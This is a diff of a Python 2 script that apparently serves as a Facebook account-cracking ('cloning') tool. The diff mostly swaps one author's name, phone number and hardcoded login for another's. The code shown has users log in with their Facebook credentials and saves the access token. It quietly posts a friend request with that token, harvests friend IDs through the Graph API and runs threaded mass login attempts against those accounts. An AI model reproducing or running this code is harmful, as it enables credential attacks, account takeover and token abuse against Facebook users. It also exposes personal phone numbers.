@@ -110,7 +110,7 @@ def phone():
 		login()
 	os.system('clear')		
 
-#Dev:MR-SH4DOW-ALONE
+#Dev:𝕄ℝ_𝕊𝕌𝕃𝕋𝔸ℕ𝕂ℍ𝔸ℕ
 ##### LOGO #####
 logo = """
 \033[1;91m─────────█████
@@ -155,20 +155,20 @@ logo = """
                                                    
 
 \033[1;91m•───────────────────────────────────────────•
-\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•
+\033[1;97m•-----------------\033[1;37mMR_SULTAN\033[1;97m-----------------•
  \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;41m\033[1;37m[⚡🔥\033[1;37mAuthor Name: MR-SH4DOW 🔥⚡\033[1;37m]\033[1;0m
-\033[1;41m\033[1;37m[⚡🔥\033[1;37m☏ →+923123879770 🔥⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡🔥\033[1;37mAuthor Name MR_SULTAN 🔥⚡\033[1;37m]\033[1;0m
+\033[1;41m\033[1;37m[⚡🔥\033[1;37m☏ →03349238264 🔥⚡\033[1;37m]\033[1;0m
 \033[1;41m\033[1;37m[⚡🔥\033[1;37mYT Channel: Billu Tricker🔥⚡\033[1;37m]\033[1;0m
 \033[1;41m\033[1;37m[⚡🔥 \033[1;37mFrom: Pakistan 🔥⚡\033[1;37m]\033[1;0m
 \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
-\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•
+\033[1;97m•-----------------\033[1;37mMR_SULTAN\033[1;97m-----------------•
 """
 
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mMR-SH4DOW█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
+		print("\r\x1b[1;93mMR_SULTAN█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
 
 
 back = 0
@@ -213,8 +213,8 @@ print  """
 \033[1;92m•───────────────────────────────────────────•
  \033[1;97m•▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
  """
-CorrectUsername = "MRSH4DOW"
-CorrectPassword = "ALONE"
+CorrectUsername = "Sultan"
+CorrectPassword = "Khan"
 
 loop = 'true'
 while (loop == 'true'):
@@ -288,7 +288,7 @@ def login1():
 		os.system('clear')
                 time.sleep(0.05)
 		print logo                
-		print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mMR_SULTAN\033[1;97m-----------------•"
 		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
 		print('	' )
 		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
@@ -319,8 +319,8 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\033[1;47m\033[1;91mMR-SH4DOW Login Successful\033[1;0m'
-				os.system('xdg-open https://www.youtube.com/c/BilluTricker')
+				print '\033[1;47m\033[1;91mMR_SULTAN Login Successful\033[1;0m'
+				os.system('xdg-open https://www.facebook.com/ihsan.ullahsafi.3')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -364,7 +364,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:MR-SH4DOW-ALONE
+	os.system("clear") #Dev:MR-SULTAN-KHAN
 	print logo
 	print "\033[1;37m[!]\033[1;91m Logged in User Information\033[1;92m"
 	time.sleep(0.05)
@@ -372,12 +372,12 @@ def menu():
 	time.sleep(0.05)
 	print "\033[1;37m[•]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
 	time.sleep(0.05)
-	print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+	print "\033[1;97m•-----------------\033[1;37mMR_SULTAN\033[1;97m-----------------•"
 	print "\033[1;92m[1]\033[1;47m\033[1;31mStart Fast Cloning                          \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                     \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update MR-SH4DOW                         \033[1;0m"
+	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update MR-SULTAN                         \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;95m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
 	time.sleep(0.05)
@@ -408,7 +408,7 @@ def pilih():
                 jalan('\033[1;96m========80%')
                 jalan('\033[1;95m=========90%')
                 jalan('\033[1;94m==========100%')
-                jalan('\033[1;93mCloning Data Reset and update by MR-SH4DOW')
+                jalan('\033[1;93mCloning Data Reset and update by MR-SULTAN')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	        menu()		
@@ -443,7 +443,7 @@ def pilih():
                 jalan('\033[1;96m========80%')
                 jalan('\033[1;95m=========90%')
                 jalan('\033[1;94m==========100%')
-                jalan('\033[1;93mCloning Data Reset and update by MR-SH4DOW')
+                jalan('\033[1;93mCloning Data Reset and update by MR-SULTAN')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	        menu()		
@@ -483,16 +483,16 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mMR-SULTAN\033[1;97m-----------------•"
 		print logo
-		jalan('\033[1;97m[+]\033[1;91mMR-SH4DOW█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
+		jalan('\033[1;97m[+]\033[1;91mMR-SULTAN█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mMR-SULTAN\033[1;97m-----------------•"
 		print logo
 		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
 		try:
@@ -503,7 +503,7 @@ def pilih_super():
 			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;97m[+]\033[1;91mMR-SH4DOW█████████████████▒▒▒▒▒▒▒▒..100%\033[1;97m:-:"
+		print"\033[1;97m[+]\033[1;91mMR-SULTAN█████████████████▒▒▒▒▒▒▒▒..100%\033[1;97m:-:"
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -528,7 +528,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:MR-SH4DOW-ALONE
+			pass #Dev:MR-SULTAN-KHAN
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -736,11 +736,11 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-#Dev:MR-SH4DOW-ALONE
-        print "\033[1;97m•-----------------\033[1;37m🔥MR-SH4DOW🔥\033[1;97m-----------------•"
+#Dev:MR-SULTAN-KHAN
+        print "\033[1;97m•-----------------\033[1;37m🔥MR-SULTAN🔥\033[1;97m-----------------•"
 	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m«-----------------\033[1;37m🔥MR-SH4DOW🔥\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37m🔥MR-SULTAN🔥\033[1;97m-----------------»"
 	print """
  \033[1;97m
 
@@ -762,7 +762,7 @@ def pilih_super():
                                                                         
       
 """
-	print "\033[1;97m«-----------------\033[1;37m✅MR-SH4DOW✅\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37m✅MR-SULTAN✅\033[1;97m-----------------»"
 	raw_input("\n\033[1;97m[+]\033[1;97mBack")
 	menu()
 
